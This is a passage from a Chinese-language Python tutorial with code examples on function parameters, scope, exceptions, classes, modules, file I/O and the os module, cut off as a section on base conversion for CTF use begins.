\nfun(100)\t\t#只传一个参数，b采用默认值\nfun(20,30)\t\t#30将默认值10替换\n```\n\n### 15.4.2 个数可变的位置参数\n\n定义函数时，可能无法事先确定传递的位置实参的个数时，使用可变的位置参数。使用`*`定义个数可变的位置形参，结果为一个元组。\n\n```python\ndef fun(*args):\n    print(args)\n    print(args[0])\nfun(10)\nfun(10,20)\nfun(10,20,30)\n'''\n(10,)\n10\n(10, 20)\n10\n(10, 20, 30)\n10\n'''\n```\n\n```python\ndef fun2(*args,*a):\n    pass\n#以上代码程序报错，可变位置参数只能是一个\n```\n\n### 15.4.3 个数可变的关键字形参\n\n定义函数时，无法事先确定传递的关键字实参的个数时，使用可变的关键字形参。使用`**`定义个数可变的关键字形参，结果为一个字典。\n\n```python\ndef fun(**args):\n\tprint(args)\nfun(a = 10)\nfun(a=10, b=20, c=30)\n```\n\n```python\ndef fun2(**args,**a):\n    pass\n#以上代码程序报错，可变关键字参数只能是一个\n```\n\n```python\ndef fun3(*args1,**args2):\n    pass\n#既有可变位置参数又有可变关键字参数，要求可变位置参数放在可变关键字参数之前\n```\n\n## 15.5 函数的参数总结\n\n| 参数的类型                             | 函数的定义 | 函数的调用 | 备注   |\n| -------------------------------------- | ---------- | ---------- | ------ |\n| 位置实参                               |            | √          |        |\n| 将序列中的每个元素都转换为位置实参     |            | √          | 使用*  |\n| 关键字实参                             |            | √          |        |\n| 将字典中的每个键值对都转换为关键字实参 |            | √          | 使用** |\n| 默认值形参                             | √          |            |        |\n| 关键字形参                             | √          |            | 使用*  |\n| 个数可变的位置形参                     | √          |            | 使用*  |\n| 个数可变的关键字形参                   | √          |            | 使用** |\n\n```python\ndef fun(a,b,c):\t#形参\n    print('a = ', a)\n    print('b = ', b)\n    print('c = ', c)\nfun(10,20,30)\t#位置实参\nlst = [11,22,33]\nfun(*lst)\t\t#将列表中的每个元素都转换为位置实参传入\nfun(a=100, c=300, b=200)\t#关键字实参\ndic = {'a':111, 'b':222, 'c':333}\nfun(**dic)\t\t#在函数调用时，将字典中的键值对都转换为关键字实参传入\n```\n\n```python\ndef fun(a, b=10):\t#默认值形参\n    print('a = ', a)\n    print('b = ', b)\n\ndef fun2(*args):\t#个数可变的位置形参\n    print(args)\n\ndef fun3(**args2):\t#个数可变的关键字形参\n    print(args2)\n    \nfun2(10,20,30,40)\nfun3(a=11,b=22,c=33)\n\ndef fun4(a,b,c,d):\n    print('a = ', a)\n    print('b = ', b)\n    print('c = ', c)\n    print('d = ', d)\n\nfun4(10,20,30,40,50)\t#位置实参\nfun4(a=10,b=20,c=30)\t#关键字实参\nfun4(10,20,d=30,c=40)\n\n#c,d只能采用关键字实参传递\ndef fun5(a,b,*,c,d):\t#从*之后，只能采用关键字参数传递\n    pass\n```\n\n# 16. 变量的作用域\n\n变量的作用域：程序代码能访问该变量的区域。根据变量的有效范围可分为局部变量和全局变量。\n\n局部变量：在函数内定义并使用的变量，只在函数内部有效，局部变量使用global声明，这个变量就会变成全局变量。\n\n全局变量：函数体外定义的变量，可作用于函数内外。\n\n```python\ndef fun(a,b):\n    c = a + b\n    print(c)\n\nname = 'v5le0n9'\t#全局变量\nprint(name)\ndef fun2():\n    print(name)\nfun2()\n\ndef fun3():\n    global age\t\t#全局变量\n    age = 20\n    print(age)\nfun3()\nprint(age)\n'''\nv5le0n9\nv5le0n9\n20\n20\n'''\n```\n\n# 17. 递归函数\n\n在一个函数的函数体内调用该函数本身。\n\n```python\ndef fac(n):\n    if n==1:\n        return 1\n    else:\n        return n*fac(n-1)\nprint(fac(6))\n```\n\n```python\n#斐波那契数列\ndef fib(n):\n    if n==1:\n        return 1\n    elif n==2:\n        return 1\n    else:\n        return fib(n-1)+fib(n-2)\nprint(fib(6))\n\nfor i in range(1,7):\n    print(fib(i), end='\\t')\n'''\n8\n1       1       2       3       5       8\n'''\n```\n\n# 18. Python的异常处理机制\n\n## 18.1 try...except\n\n```python\ntry:\n    a = int(input(\"请输入第一个整数：\"))\n    b = int(input(\"请输入第二个整数：\"))\n    result = a / b\n    print('结果为：', result)\nexcept ZeroDivisionError:\n    print('对不起，除数不允许为0')\nexcept ValueError:\n    print('只能输入数字串')\nprint('程序结束')\n'''\n请输入第一个整数：20\n请输入第二个整数：0\n对不起，除数不允许为0\n程序结束\n'''\n```\n\n## 18.2 try...except...else\n\n如果try块中没有抛出异常，则执行else块，如果try中抛出异常，则执行except块。\n\n```python\ntry:\n    n1 = int(input(\"请输入一个整数：\"))\n    n2 = int(input(\"请输入另一个整数：\"))\n    result = n1 / n2\nexcept BaseException as e:\n    print(\"出错了！\")\n    print(e)\nelse:\n    print(\"结果为：\", result)\n'''\n请输入一个整数：10\n请输入另一个整数：0\n出错了！\ndivision by zero\n'''\n```\n\n## 18.3 try...except...else...finally\n\nfinally块无论是否发生异常都会被执行，能常用来释放try块中申请的资源。\n\n```python\ntry:\n    n1 = int(input(\"请输入一个整数：\"))\n    n2 = int(input(\"请输入另一个整数：\"))\n    result = n1 / n2\nexcept BaseException as e:\n    print(\"出错了！\")\n    print(e)\nelse:\n    print(\"结果为：\", result)\nfinally:\n    print(\"总会被执行的代码\")\nprint(\"程序结束\")\n'''\n请输入一个整数：a\n出错了！\ninvalid literal for int() with base 10: 'a'\n总会被执行的代码\n程序结束\n'''\n```\n\n## 18.4 常见的异常类型\n\n| 异常类型          | 描述              |\n| ----------------- | ----------------- |\n| ZeroDivisionError | 除零错误          |\n| IndexError        | 序列中没有此索引  |\n| KeyError          | 映射中没有这个键  |\n| NameError         | 未声明/初始化对象 |\n| SyntaxError       | Python语法错误    |\n| ValueError        | 传入无效参数      |\n\n## 18.5 traceback模块\n\n```python\nimport traceback\ntry:\n    print(1 / 0)\nexcept:\n    traceback.print_exc()\n'''\nTraceback (most recent call last):\n  File \"E:\\pythonproject\\PythonApplication1\\PythonApplication1\\module2.py\", line 3, in <module>\n    print(1 / 0)\nZeroDivisionError: division by zero\n'''\n```\n\n# 19. 类与对象\n\n## 19.1 类的创建\n\n```python\nclass Student:\t#类名有一个或多个单词组成，每个单词首字母大写\n    pass\nprint(id(Student))\nprint(type(Student))\nprint(Student)\n'''\n2519221836392\n<class 'type'>\n<class '__main__.Student'>\n'''\n```\n\n```python\nclass Student:\n    native_pace = \"广东\"\t\t#属性\n    \n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n        \n    #实例方法\n    def eat(self):\t\t\t\n        print(\"学生在吃饭\")\n    \n    #静态方法\n    @staticmethod\n    def menthod():\t\t\t#静态方法不允许写self符号\n        print(\"静态方法\")\n        \n    #类方法\n    @classmethod\n    def cm(cls):\n        print(\"类方法\")\n        \n#在类之外定义的称为函数，在类内部定义的称为方法\ndef drink():\t\t\t#函数\n    print(\"喝水\")\n    \n#创建Student对象的实例对象\nstu1 = Student('张三', 20)\nprint(id(stu1))\nprint(type(stu1))\nprint(stu1)\nstu1.eat()\nprint(stu1.age)\nStudent.eat(stu1)\t\t#33行与31行代码相同\n'''\n2611936977032\n<class '__main__.Student'>\n<__main__.Student object at 0x0000026023936088>\n学生在吃饭\n20\n学生在吃饭\n'''\n```\n\n## 19.2 类属性、类方法、静态方法\n\n类属性：类中方法外的变量称为类属性，被该类的所有对象共享\n\n类方法：使用@classmethod 修饰的方法，使用类名直接访问的方法\n\n静态方法：使用@staticmethod 修饰的方法，使用类名直接访问的方法\n\n```python\nclass Student:\n    native_pace = \"广东\"\t\t#属性\n    \n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n        \n    #实例方法\n    def eat(self):\t\t\t\n        print(\"学生在吃饭\")\n    \n    #静态方法\n    @staticmethod\n    def method():\t\t\t#静态方法不允许写self符号\n        print(\"静态方法\")\n        \n    #类方法\n    @classmethod\n    def cm(cls):\n        print(\"类方法\")\n            \nprint(Student.native_pace)\nstu1 = Student('张三',20)\nstu2 = Student('李四',30)\nprint(stu1.native_pace)\nprint(stu2.native_pace)\nStudent.native_pace = \"天津\"\nprint(stu1.native_pace)\nprint(stu2.native_pace)\nStudent.cm()\nStudent.method()\n'''\n广东\n广东\n广东\n天津\n天津\n类方法\n静态方法\n'''\n```\n\n## 19.3 动态绑定属性和方法\n\n```python\nclass Student:  \n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n        \n    def eat(self):\t\t\t\n        print(self.name + \"在吃饭\")\nstu1 = Student(\"张三\", 20)\nstu1.eat()\nstu2 = Student(\"李四\", 30)\nstu2.eat()\n\n#绑定属性\nstu2.gender = '女'\nprint(stu2.name, stu2.age, stu2.gender)\n\n#绑定方法\ndef show():\n    print(\"定义在类之外\")\nstu1.show = show\nstu1.show()\n'''\n张三在吃饭\n李四在吃饭\n李四 30 女\n定义在类之外\n'''\n```\n\n## 19.4 封装\n\n面向对象的三大特征：\n\n- 封装：提高程序的安全性\n- 继承：提高代码的复用性\n- 多态：提高程序的可扩展性和可维护性\n\n```python\nclass Car:\n    def __init__(self,brand):\n        self.brand = brand\n    def start(self):\n        print(\"汽车已启动...\")\ncar = Car('宝马x5')\ncar.start()\nprint(car.brand)\n```\n\n```python\nclass Student:\n    def __init__(self, name, age):\n        self.name = name\n        self.__age = age\t#属性私有\n    def show(self):\n        print(self.name, self.__age)\nstu = Student(\"张三\", 20)\nstu.show()\t\t\t#张三 20\nprint(stu.name)\t\t#张三\n#print(stu.__age)\t#不能在类外部使用\nprint(dir(stu))\n#['_Student__age', '__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'name', 'show']\nprint(stu._Student__age)\t#20，可以通过'_Student__age'访问\n```\n\n## 19.5 继承\n\n如果一个类没有继承任何类，则默认继承object。python支持多继承，定义子类时，必须在其构造函数中调用父类的构造函数。\n\n```python\n#定义父类\nclass Person(object):\n    def __init__(self, name, age):\n        self.name = name\n        self.age = age\n    def info(self):\n        print('姓名:{0}，年龄:{1}'.format(self.name,self.age))\n\n#定义子类 \nclass Student(Person):\n    def __init__(self, name, age, score):\n        super().__init__(name, age)\n        self.score = score\nstu = Student('Jack', 20, '1001')\nstu.info()\n'''\n姓名:Jack，年龄:20\n'''\n```\n\n```python\n#多继承\nclass A(object):\n    pass\nclass B(object):\n    pass\nclass C(A,B):\n    pass\n```\n\n### 19.5.1 方法重写\n\n```python\n#定义父类\nclass Person(object):\n    def __init__(self, name, age):\n        self.name = name\n        self.age = age\n    def info(self):\n        print('姓名:{0}，年龄:{1}'.format(self.name,self.age))\n\n#定义子类 \nclass Student(Person):\n    def __init__(self, name, age, score):\n        super().__init__(name, age)\n        self.score = score\n    def info(self):\n        super().info()\n        print(self.score)\nstu = Student('Jack', 20, '1001')\nstu.info()\n'''\n姓名:Jack，年龄:20\n1001\n'''\n```\n\n### 19.5.2 object类\n\nobject类是所有类的父类，因此所有类都有object类的属性和方法。\n\n内置函数dir()可以查看指定对象所有属性。\n\nobject有一个\\_\\_str\\_\\_()方法，用于返回一个对于“对象的描述”，对应于内置函数str()经常用于print()方法，帮我们查看对象的信息，所以我们经常会对\\_\\_str\\_\\_()进行重写。\n\n```python\nclass Student:\n    pass\nstu = Student()\nprint(dir(stu))\nprint(stu)\n'''\n['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__']\n<__main__.Student object at 0x00000297B7A94788>\n'''\n```\n\n```python\nclass Student:\n    def __init__(self, name, age):\n        self.name = name\n        self.age = age\n    def __str__(self):\n        return '我的名字是{0}，今年{1}岁'.format(self.name,self.age)\nstu = Student('张三', 20)\nprint(dir(stu))\nprint(stu)\t\t\t#默认调用__str__()方法\nprint(type(stu))\n'''\n['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'age', 'name']\n我的名字是张三，今年20岁\n<class '__main__.Student'>\n'''\n```\n\n## 19.6 多态\n\n静态语言实现多态的三个必要条件，比如Java：\n\n1. 继承\n2. 方法重写\n3. 父类引用指向子类对象\n\n动态语言(Python)的多态崇尚“鸭子类型”，当看到一只鸟走起来像鸭子、游起来像鸭子、叫起来像鸭子，那么这只鸟就可以被称为鸭子。在鸭子类型中，不需要关心对象是什么类型，到底是不是鸭子，只关心对象的行为。\n\n```python\nclass Animal(object):\n    def eat(self):\n        print(\"动物会吃\")\nclass Dog(Animal):\n    def eat(self):\n        print(\"狗吃骨头\")\nclass Cat(Animal):\n    def eat(self):\n        print(\"猫吃鱼\")\nclass Person:\n    def eat(self):\n        print(\"人吃五谷杂粮\")\n\ndef fun(obj):\n    obj.eat()\nfun(Cat())\nfun(Dog())\nfun(Animal())\nfun(Person())\n'''\n猫吃鱼\n狗吃骨头\n动物会吃\n人吃五谷杂粮\n'''\n```\n\n## 19.7 特殊的属性和方法\n\n|          | 名称           | 描述                                                         |\n| -------- | -------------- | ------------------------------------------------------------ |\n| 特殊属性 | \\_\\_dict\\_\\_   | 获得类对象或实例对象所绑定的所有属性和方法的字典             |\n| 特殊方法 | \\_\\_len_\\_()   | 通过重写\\_\\_len()\\_\\_方法，让内置函数len()的参数可以是自定义类型 |\n|          | \\_\\_add_\\_()   | 通过重写\\_\\_add\\_\\_()方法，可使用自定义对象具有“+”功能       |\n|          | \\_\\_new\\_\\_()  | 用于创建对象                                                 |\n|          | \\_\\_init\\_\\_() | 对创建的对象进行初始化                                       |\n\n```python\nclass A:\n    pass\nclass B:\n    pass\nclass C(A,B):\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\nclass D(A):\n    pass\n\n#创建C类的对象\nx = C('Jack',20)\nprint(x.__dict__)\t#实例对象的属性字典\nprint(C.__dict__)\t#类对象的方法字典\nprint(x.__class__)\t#输出了对象所属的类\nprint(C.__bases__)\t#输出C类类型的元素\nprint(C.__base__)\t#输出第一个父类的元素\nprint(C.__mro__)\t#查看类的层次结构\nprint(A.__subclasses__())\t#输出子类的列表\n'''\n{'name': 'Jack', 'age': 20}\n{'__module__': '__main__', '__init__': <function C.__init__ at 0x000002805E552AF8>, '__doc__': None}\n<class '__main__.C'>\n(<class '__main__.A'>, <class '__main__.B'>)\n<class '__main__.A'>\n(<class '__main__.C'>, <class '__main__.A'>, <class '__main__.B'>, <class 'object'>)\n[<class '__main__.C'>, <class '__main__.D'>]\n'''\n```\n\n```python\na = 20\nb = 100\nc = a + b\nd = a.__add__(b)\nprint(c)\nprint(d)\n\nclass Student:\n    def __init__(self, name):\n        self.name = name\n    def __add__(self, other):\n        return self.name + other.name\n    def __len__(self):\n        return len(self.name)\n        \nstu1 = Student('v5le0n9')\nstu2 = Student('李四')\ns = stu1 + stu2\nprint(s)\ns = stu1.__add__(stu2)\nprint(s)\n\nlst = [22,33,44,11]\nprint(len(lst))\nprint(lst.__len__())\nprint(len(stu1))\n'''\n120\n120\nv5le0n9李四\nv5le0n9李四\n4\n4\n7\n'''\n```\n\n```python\nclass Person():\n    def __new__(cls, *args, **kwargs):\n        print('__new__被调用执行了，cls的id值为{0}'.format(id(cls)))\n        obj = super().__new__(cls)\n        print('创建的对象的id为：{0}'.format(id(obj)))\n        return obj\n    \n    def __init__(self,name,age):\n        print(\"__init__被调用执行了，self的id值为{0}\".format(id(self)))\n        self.name = name\n        self.age = age\n\nprint(\"object类对象的id为：{0}\".format(id(object)))\nprint(\"Person类对象的id为：{0}\".format(id(Person)))\n\n#创建Person类的实例对象\np1 = Person('张三', 20)\t#创建对象会执行__new__()和__init__(),将__init__()返回给p1\nprint('p1这个Person类的实例对象的id为：{0}'.format(id(p1)))\n'''\nobject类对象的id为：140736155446064\nPerson类对象的id为：1253089495272\n__new__被调用执行了，cls的id值为1253089495272\n创建的对象的id为：1253119249672\n__init__被调用执行了，self的id值为1253119249672\np1这个Person类的实例对象的id为：1253119249672\n'''\n```\n\n## 19.8 类的浅拷贝与深拷贝\n\n变量的赋值操作：只是形成两个变量，实际上还是指向同一个对象。\n\n浅拷贝：Python拷贝一般都是浅拷贝，拷贝时，对象包含的子对象内容不拷贝，因此，原对象与拷贝对象会引用同一个子对象。\n\n深拷贝：使用copy模块的deepcopy函数，递归拷贝对象中包含的子对象，原对象和拷贝对象所有的子对象也不相同。\n\n```python\nclass CPU:\n    pass\nclass Disk:\n    pass\nclass Computer:\n    def __init__(self, cpu, disk):\n        self.cpu = cpu\n        self.disk = disk\n\n#变量的赋值\ncpu1 = CPU()\ncpu2 = cpu1\nprint(cpu1, id(cpu1))\nprint(cpu2, id(cpu2))\n\n#类的浅拷贝\ndisk = Disk()\ncomputer = Computer(cpu1, disk)\nimport copy\ncomputer2 = copy.copy(computer)\nprint(computer,computer.cpu,computer.disk)\nprint(computer2,computer2.cpu,computer2.disk)\n'''\n<__main__.CPU object at 0x0000021A6ADE6348> 2312485364552\n<__main__.CPU object at 0x0000021A6ADE6348> 2312485364552\n<__main__.Computer object at 0x0000021A6ADE8148> <__main__.CPU object at 0x0000021A6ADE6348> <__main__.Disk object at 0x0000021A6ADE4EC8>\n<__main__.Computer object at 0x0000021A6ADE8488> <__main__.CPU object at 0x0000021A6ADE6348> <__main__.Disk object at 0x0000021A6ADE4EC8>\n'''\n```\n\n```python\nclass CPU:\n    pass\nclass Disk:\n    pass\nclass Computer:\n    def __init__(self, cpu, disk):\n        self.cpu = cpu\n        self.disk = disk\n\ncpu1 = CPU()        \ndisk = Disk()\ncomputer = Computer(cpu1, disk)\n#类的深拷贝\nimport copy\ncomputer3 = copy.deepcopy(computer)\nprint(computer,computer.cpu,computer.disk)\nprint(computer3,computer3.cpu,computer3.disk)\n'''\n<__main__.Computer object at 0x000001D8BF2B54C8> <__main__.CPU object at 0x000001D8BDAE2848> <__main__.Disk object at 0x000001D8BF2B4CC8>\n<__main__.Computer object at 0x000001D8BF2B69C8> <__main__.CPU object at 0x000001D8BF2B6688> <__main__.Disk object at 0x000001D8BF2B6508>\n'''\n```\n\n# 20. 模块\n\n使用模块的好处：\n\n- 方便其他程序和脚本的导入并使用\n- 避免函数名和变量名冲突\n- 提高代码的可维护性\n- 提高代码的可重用性\n\n## 20.1 模块的导入\n\n```python\nimport math\nprint(id(math))\nprint(type(math))\nprint(math)\nprint(math.pi)\nprint(dir(math))\nprint(math.pow(2,3))\nprint(math.ceil(9.001))\t#向上取整\nprint(math.floor(9.999))\t#向下取整\n'''\n1512215034680\n<class 'module'>\n<module 'math' (built-in)>\n3.141592653589793\n['__doc__', '__loader__', '__name__', '__package__', '__spec__', 'acos', 'acosh', 'asin', 'asinh', 'atan', 'atan2', 'atanh', 'ceil', 'copysign', 'cos', 'cosh', 'degrees', 'e', 'erf', 'erfc', 'exp', 'expm1', 'fabs', 'factorial', 'floor', 'fmod', 'frexp', 'fsum', 'gamma', 'gcd', 'hypot', 'inf', 'isclose', 'isfinite', 'isinf', 'isnan', 'ldexp', 'lgamma', 'log', 'log10', 'log1p', 'log2', 'modf', 'nan', 'pi', 'pow', 'radians', 'remainder', 'sin', 'sinh', 'sqrt', 'tan', 'tanh', 'tau', 'trunc']\n8.0\n10\n9\n'''\n```\n\n```python\nfrom math import pi\nprint(pi)\n'''\n3.141592653589793\n'''\n```\n\n```python\n#calc.py\ndef add(a, b):\n    return a + b\ndef div(a, b):\n    return a / b\n```\n\n```python\nimport calc\nprint(calc.add(10,20))\nprint(calc.div(4, 2))\n```\n\n## 20.2 以主程序形式运行\n\n在每个模块的定义中都包括一个记录模块名称的变量\\_\\_name\\_\\_，程序可以检查该变量，以确定它们在哪个模块中运行。如果一个模块不是被导入到其它程序中执行，那么他可能在解释器的顶级模块中执行。顶级模块的\\_\\_name\\_\\_变量的值为\\_\\_main\\_\\_。\n\n```python\n#calc2.py\ndef add(a, b):\n    return a + b\nprint(add(10,20))\n```\n\n```python\nimport calc2\nprint(calc2.add(100,200))\n'''\n30\n300\n'''\n```\n\n```python\n#calc2.py\ndef add(a, b):\n    return a + b\n\nif __name__ == '__main__':\n    print(add(10,20))\t#只有当点击运行calc2.py时才运行\n```\n\n```python\nimport calc2\nprint(calc2.add(100,200))\n'''\n300\n'''\n```\n\n## 20.3 包\n\n包是一个分层次的目录结构，它将一组功能相近的模块组织在一个目录下。\n\n作用：代码规范，避免模块名称冲突。\n\n包与目录的区别：\n\n- 包含`__init__.py`文件的目录称为包\n- 目录里通常不包含`__init__.py`文件\n\n包的导入：\n\n```python\nimport 包名.模块包\n```\n\n`package1`包中有`module_A.py`模块：\n\n```python\na = 10\n```\n\n有`module_B.py`模块：\n\n```python\nb = 100\n```\n\n在另一个模块中导入`package1`包。\n\n```python\nimport package1.module_A as ma\t#as后面的是别名\nprint(package1.module_A.a)\nprint(ma.a)\n```\n\n```python\nfrom package1 import module_A\t#导入模块\nfrom package1.module_A import a\t#导入变量\n```\n\n## 20.4 常用的内置模块\n\n| 模块名   | 描述                                                         |\n| -------- | ------------------------------------------------------------ |\n| sys      | 与Python解释器及其环境操作相关的标准库                       |\n| time     | 提供与时间相关的各种函数的标准库                             |\n| os       | 提供了访问操作系统服务功能的标准库                           |\n| calendar | 提供与日期相关的各种函数的标准库                             |\n| urllib   | 用于读取来自网上的数据标准库                                 |\n| json     | 用于使用JSON序列化和反序列化对象                             |\n| re       | 用于在字符串中执行正则表达式匹配和替换                       |\n| math     | 提供标准算数运算函数的标准库                                 |\n| decimal  | 用于进行精确控制运算精度、有效数位和四舍五入操作的十进制运算 |\n| logging  | 提供了灵活的记录事件、错误、警告和调试信息等日志信息的功能   |\n\n```python\nimport sys\nprint(sys.getsizeof(24))\nprint(sys.getsizeof(45))\nprint(sys.getsizeof(True))\nprint(sys.getsizeof(False))\n'''\n28\n28\n28\n24\n'''\n```\n\n```python\nimport time\nprint(time.time())\nprint(time.localtime(time.time()))\n'''\n1647265802.3989463\ntime.struct_time(tm_year=2022, tm_mon=3, tm_mday=14, tm_hour=21, tm_min=50, tm_sec=2, tm_wday=0, tm_yday=73, tm_isdst=0)\n'''\n```\n\n```python\nimport urllib.request\nprint(urllib.request.urlopen('https://v5le0n9.github.io/').read())\n```\n\n# 21. 编码格式与文件读写\n\n## 21.1 编码格式\n\nPython的解释器使用的是Unicode(内存)，`.py`文件在磁盘上使用UTF-8存储(外存)。\n\n```python\n#默认为UTF-8编码\nprint(\"哈哈哈哈哈哈\")\n```\n\n设置为GBK编码：\n\n```python\n#encoding = gbk\nprint('哈哈哈哈哈哈')\n```\n\n## 21.2 文件读写原理\n\n```python\nfile = open('a.txt', 'r')\nprint(file.readlines())\nfile.close()\n#每行的结果放在一个列表中\n```\n\n## 21.3 常用的文件打开模式\n\n文件的类型：按文件中数据的组织形式，文件分为文本文件和二进制文件。\n\n- 文本文件：存储的是普通“字符”文本，默认为Unicode字符集，可以使用记事本程序打开。\n- 二进制文件：把数据内容用“字节”进行存储，无法用记事本打开，必须使用专用的软件打开。比如mp3音频文件，jpg图片，doc文档等。\n\n| 打开模式 | 描述                                                         |\n| -------- | ------------------------------------------------------------ |\n| r        | 以只读模式打开文件，文件的指针将会放在文件的开头             |\n| w        | 以只写模式打开文件，如果文件不存在则创建，如果文件存在，则覆盖原有内容，文件指针在文件的开头 |\n| a        | 以追加模式打开文件，如果文件不存在则创建，文件指针在文件开头，如果文件存在，则在文件末尾追加内容，文件指针在原文件末尾 |\n| b        | 以二进制方式打开文件，不能单独使用，需要与其它模式一起使用，rb或wb |\n| +        | 以读写方式打开文件，不能单独使用，需与其它模式一起使用，a+   |\n\n```python\nfile = open('b.txt', 'w')\nfile.write('Python')\nfile.close()\n\nfile = open('b.txt', 'a')\nfile.write('Python')\nfile.close()\n```\n\n```python\nsrc_file = open('logo,png', 'rb')\ntarget_file = open('copylogo.png', 'wb')\nprint(target_file.write(src_file.read()))\ntarget_file.close()\nsrc_file.close()\n```\n\n## 21.4 文件对象的常用方法\n\n| 方法名                 | 说明                                                         |\n| ---------------------- | ------------------------------------------------------------ |\n| read([size])           | 从文件中读取size个字节或字符的内容返回，若省略[size]，则读取到文件末尾，即一次读取文件所有内容 |\n| readline()             | 从文本文件中读取一行内容                                     |\n| readlines()            | 把文本文件中每一行都作为独立的字符串对象，并将这些对象放入列表返回 |\n| write(str)             | 将字符串str内容写入文件                                      |\n| writelines(s_list)     | 将字符串列表s_list写入文本文件，不添加换行符                 |\n| seek(offset [,whence]) | 把文件指针移动到新的位置，offset表示相对于whence的位置：offset：为正往结束方向移动，为负往开始方向移动。<br />whence不同的值代表不同含义：<br />0：从文件头开始计算（默认值）<br />1：从当前位置开始计算<br />2：从文件尾开始计算 |\n| tell()                 | 返回文件指针的当前位置                                       |\n| flush()                | 把缓冲区的内容写入文件，但不关闭文件                         |\n| close()                | 把缓冲区的内容写入文件，同时关闭文件，释放文件对象相关资源   |\n\n```python\nfile = open('a.txt', 'r')\nprint(file.read(2))\nprint(file.readline())\nprint(file.readlines())\nfile.close()\n```\n\n```python\nfile = open('c.txt', 'a')\nfile.write('hello')\nlst = ['Java', 'Python']\nfile.writelines(lst)\nfile.close()\n```\n\n```python\nfile = open('a.txt', 'r')\nfile.seek(2)\nprint(file.read())\nprint(file.tell())\nfile.close()\n```\n\n```python\nfile = open('c.txt', 'a')\nfile.write('hello')\nfile.flush()\nfile.write('world')\nfile.close()\n```\n\n## 21.5 with语句\n\nwith语句可以自动管理上下文资源，不论什么么原因跳出with块，都能确保文件正确的关闭，以此来达到释放资源的目的。\n\n```python\nwith open('a.txt', 'r') as file:\n    print(file.read())\n```\n\n```python\n'''\nMyContentMgr实现了特殊方法：__enter__(),__exit__()称为该类对象遵守了上下文管理器协议\n该类对象的实例对象，成为上下文管理器\n'''\nclass MyContentMgr(object):\n    def __enter__(self):\n        print('enter方法被调用执行了')\n        return self\n    def __exit__(self,exc_type,exc_val,exc_tb):\n        print(\"exit方法被调用执行了\")\n    def show(self):\n        print(\"show方法被调用执行了\")\nwith MyContentMgr() as file:\n    file.show()\n'''\nenter方法被调用执行了\nshow方法被调用执行了\nexit方法被调用执行了\n'''\n```\n\n```python\nwith open('logo.png', 'rb') as src_file:\n    with open('copy2logo.png', 'wb') as target_file:\n        target_file.write(src_file.read())\n```\n\n## 21.6 os模块的常用函数\n\nos模块是Python内置的与操作系统功能和文件系统相关的模块，该模块中的语句的执行结果通常与操作系统有关，在不同的操作系统上运行，得到的结果可能不一样。\n\nos模块与os.path模块用于对目录或文件进行操作。\n\n```python\nimport os\nos.system('notepad.exe')\nos.system('calc.exe')\n\n#直接调用可执行文件\nos.startfile(r'D:\\CTF\\tools\\IDA_Pro_v7.5\\ida.exe')\n```\n\n| 函数                            | 说明                           |\n| ------------------------------- | ------------------------------ |\n| getcwd()                        | 返回当前的工作目录             |\n| listdir(path)                   | 返回指定路径下的文件和目录信息 |\n| mkdir(path [,mode])             | 创建目录                       |\n| makedirs(path1/path2...[,mode]) | 创建多级目录                   |\n| rmdir(path)                     | 删除目录                       |\n| removedirs(path1/path2...)      | 删除多级目录                   |\n| chdir(path)                     | 将path设置为当前工作目录       |\n\n```python\nimport os\nprint(os.getcwd())\nlst = os.listdir('../chap15')\nprint(lst)\nos.mkdir('newdir2')\nos.makedirs('A/B/C')\nos.rmdir('newdir2')\nos.removedirs('A/B/C')\nos.chdir('E:\\\\vipp')\nprint(os.getcwd())\n```\n\n## 21.7 os.path模块操作目录相关函数\n\n| 函数            | 说明                                                        |\n| --------------- | ----------------------------------------------------------- |\n| abspath(path)   | 用于获取文件或目录的绝对路径                                |\n| exists(path)    | 用于判断文件或目录是否存在，如果存在返回True，否则返回False |\n| join(path,name) | 将目录与目录或者文件名拼接起来                              |\n| splitext()      | 分离文件名和扩展名                                          |\n| basename(path)  | 从一个目录中提取文件名                                      |\n| dirname(path)   | 从一个路径中提取文件路径，不包括文件名                      |\n| isdir(path)     | 用于判断是否为路径                                          |\n\n```python\nimport os.path\nprint(os.path.abspath('hello.py'))\nprint(os.path.exists('hello.py'), os.path.exists('v5le0n9.py'))\nprint(os.path.join('E:\\\\Python','demo13.py'))\nprint(os.path.split('E:\\\\Python\\\\demo13.py'))\nprint(os.path.splitext('demo13.py'))\nprint(os.path.basename('E:\\\\Python\\\\demo13.py'))\nprint(os.path.dirname('E:\\\\Python\\\\demo13.py'))\nprint(os.path.isdir('E:\\\\Python\\\\demo13.py'))\n```\n\n```python\n#列出指定目录下的所有py文件\nimport os\npath = os.getcwd()\nlst = os.listdir(path)\nfor filename in lst:\n    if filename.endswith('.py'):\n        print(filename)\n'''\nmodule1.py\nmodule2.py\nPythonApplication1.py\n'''\n```\n\n```python\nimport os\npath = os.getcwd()\nlst_files = os.walk(path)\nprint(lst_files)\nfor dirpath,dirname,filename in lst_files:\n    '''\n    print(dirpath)\n    print(dirname)\n    print(filename)\n    '''\n    for dir in dirname:\n        print(os.path.join(dirpath,dir))\n    for file in filename:\n        print(os.path.join(dirpath,file))\n```\n\n# 22. CTF中常用字符转换\n\n## 22.1 整数之间的进制转换\n\n```python\nprint(hex(11111))\t\t\t\t# 0x2b67\nprint(int(hex(11111),16))\t\t# 11111\nprint(oct(11111))\t\t\t\t# 0o25547\nprint(int(oct(11111),8))\t\t# 11111\nprint(hex(int(oct(11111),8)))\t# 0x2b67\n# 